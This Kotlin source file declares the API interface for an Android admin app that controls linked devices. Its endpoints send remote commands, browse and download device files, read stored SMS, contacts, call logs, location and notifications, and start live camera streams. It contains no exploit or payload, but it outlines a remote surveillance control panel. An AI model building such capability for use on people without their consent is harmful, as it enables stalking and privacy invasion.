

package com.abuzahra.admin.data.api

import com.abuzahra.admin.data.model.Command
import com.abuzahra.admin.data.model.Device
import com.abuzahra.admin.data.model.Event
import com.abuzahra.admin.data.model.RemoteFile
import okhttp3.ResponseBody

/**
 * Public API service interface.
 * All methods are suspend functions that return unwrapped data.
 * The implementation handles server envelope parsing {"ok": true, ...}.
 */
interface ApiService {

    // ── Auth ──────────────────────────────────────────────────────
    suspend fun login(request: LoginRequest): LoginResponse

    // ── Dashboard ─────────────────────────────────────────────────
    suspend fun getDevices(): List<Device>
    suspend fun getStats(): StatsResponse

    // ── Device Detail ─────────────────────────────────────────────
    suspend fun getDeviceDetail(deviceId: String): Device
    suspend fun getCommands(deviceId: String): List<Command>
    suspend fun getEvents(): List<Event>

    // ── Commands ──────────────────────────────────────────────────
    suspend fun sendCommand(deviceId: String, request: SendCommandRequest): CommandResponse

    // ── Link Code ─────────────────────────────────────────────────
    suspend fun getLinkCode(): String

    // Regenerate the current user's permanent link code.
    // POST /api/web/regenerate_code — returns {ok, code: "NEWCODE"}.
    suspend fun regenerateCode(): RegenerateCodeResponse

    // POST /api/web/tg_link_token — returns {ok, token, bot_username, deep_link_url, expires_in}
    suspend fun getTgLinkToken(): TgLinkTokenResponse

    // ── Files ─────────────────────────────────────────────────────
    suspend fun getFiles(deviceId: String, path: String = "/"): List<RemoteFile>
    suspend fun listDeviceFiles(deviceId: String, path: String): List<RemoteFile>
    suspend fun downloadFile(url: String): ResponseBody

    // Requested files: files uploaded by devices to the server (auto-expire after 1 hour).
    // GET /api/web/files?device_id=X — returns {ok, files: [...]}.
    suspend fun getRequestedFiles(deviceId: String? = null): DeviceFilesResponse

    // ── Stored Data (Firebase RTDB read) ──────────────────────────
    // GET /api/web/data/{device_id}?type=sms|contacts|calls|...
    // Lets the Admin App view data already collected from the device
    // WITHOUT sending a fresh command. Backs the "عرض البيانات الحالية"
    // choice in the data-command dialog.
    suspend fun getStoredData(deviceId: String, type: String): StoredDataResponse

    // ── Notifications (Firebase RTDB read) ────────────────────────
    // GET /api/web/notifications/{device_id}
    // Returns the device's notification stream stored by the client app
    // (NotificationsActivity polls this every 5 seconds).
    suspend fun getDeviceNotifications(deviceId: String): NotificationsListResponse

    // DELETE /api/web/notifications/{device_id}
    // Clears stored notifications in Firebase.
    suspend fun clearDeviceNotifications(deviceId: String): Boolean

    // ── Device Management ─────────────────────────────────────────
    // DELETE /api/web/unlink/{device_id}
    // Unlinks the device from the current user's account.
    suspend fun unlinkDevice(deviceId: String): Boolean

    // ── Streaming ─────────────────────────────────────────────────
    suspend fun getStreamFrame(deviceId: String, type: String): StreamFrameResponse
    suspend fun startJpegStream(deviceId: String, type: String = "video"): CommandResponse
    suspend fun stopJpegStream(deviceId: String): CommandResponse

    // ── Auth Extensions ─────────────────────────────────────────
    suspend fun firebaseAuth(request: FirebaseAuthRequest): LoginResponse
    suspend fun register(request: RegisterRequest): LoginResponse

    // ── User Management (admin only) ─────────────────────────────
    suspend fun getUsers(): List<User>
    suspend fun createUser(request: CreateUserRequest): UserResponse
    suspend fun deleteUser(userId: String): Boolean
}

// ═══════════════════════════════════════════════════════════════════
// Internal response envelope types (server returns {"ok": true, ...})
// ═══════════════════════════════════════════════════════════════════

data class CommandResponse(
    val ok: Boolean = true,
    val status: String = "",
    val message: String = "",
    val command_id: String = "",
    val result: String? = null
)

data class DevicesEnvelope(
    val ok: Boolean = true,
    val devices: List<Device> = emptyList()
)

data class CommandsEnvelope(
    val ok: Boolean = true,
    val commands: List<Command> = emptyList()
)

data class EventsEnvelope(
    val ok: Boolean = true,
    val events: List<Event> = emptyList()
)

data class FilesEnvelope(
    val ok: Boolean = true,
    val files: List<RemoteFile> = emptyList()
)

data class DeviceFilesResponse(
    val ok: Boolean = true,
    val files: List<RemoteFile> = emptyList(),
    val path: String = ""
)

data class LinkCodeResponse(
    val ok: Boolean = true,
    val link_code: String = "",
    val qr_url: String = ""
)

/**
 * Response from POST /api/web/regenerate_code.
 * Server returns {"ok": true, "code": "NEWCODE"}.
 */
data class RegenerateCodeResponse(
    val ok: Boolean = true,
    val code: String = ""
)

data class StreamFrameResponse(
    val ok: Boolean = true,
    val data: String = "",
    val timestamp: String = "",
    val source: String = ""
)

data class User(
    val id: String = "",
    val username: String = "",
    val email: String = "",
    val role: String = "",
    val created_at: String = "",
    val is_active: Boolean = true
)

data class UsersEnvelope(
    val ok: Boolean = true,
    val users: List<User> = emptyList()
)

data class CreateUserRequest(
    val username: String,
    val password: String,
    val email: String = "",
    val role: String = "viewer"
)

data class UserResponse(
    val ok: Boolean = true,
    val user: User? = null,
    val message: String = ""
)

data class DeleteResponse(
    val ok: Boolean = true,
    val message: String = ""
)

data class TgLinkTokenResponse(
    val ok: Boolean = true,
    val token: String = "",
    val bot_username: String = "",
    val deep_link_url: String = "",
    val expires_in: Int = 600
)

// ═══════════════════════════════════════════════════════════════════
// Stored-data responses (Firebase RTDB reads)
// ═══════════════════════════════════════════════════════════════════

/**
 * Response from GET /api/web/data/{device_id}?type=sms.
 *
 * The server returns:
 *   {"ok": true, "data": <firebase snapshot>, "type": "sms",
 *    "device_id": "...", "fetched_at": <unix>, "empty": true/false}
 *
 * `data` is intentionally typed as `Any?` because the shape varies by
 * type (sms/contacts/calls are arrays; location is an object; battery
 * may be a number; etc.). The viewer pretty-prints it as JSON.
 */
data class StoredDataResponse(
    val ok: Boolean = true,
    val data: Any? = null,
    val type: String = "",
    val device_id: String = "",
    val fetched_at: Double = 0.0,
    val empty: Boolean = true,
    val message: String = ""
)

/**
 * A single notification entry stored by the client app and forwarded
 * to Firebase via POST /api/data/{device_id} with type=notifications.
 *
 * Field names match what DataCollector.getRecentNotifications returns
 * (see Android-App/.../executor/DataCollector.kt).
 */
data class NotificationEntry(
    val app: String = "",
    val title: String = "",
    val text: String = "",
    val ticker: String = "",
    val timestamp: Long = 0L,
    val date: String = "",
    val package_name: String = ""
)

/**
 * Response from GET /api/web/notifications/{device_id}.
 *
 *   {"ok": true, "notifications": [...], "count": N,
 *    "device_id": "...", "fetched_at": <unix>}
 */
data class NotificationsListResponse(
    val ok: Boolean = true,
    val notifications: List<NotificationEntry> = emptyList(),
    val count: Int = 0,
    val device_id: String = "",
    val fetched_at: Double = 0.0,
    val message: String = ""
)
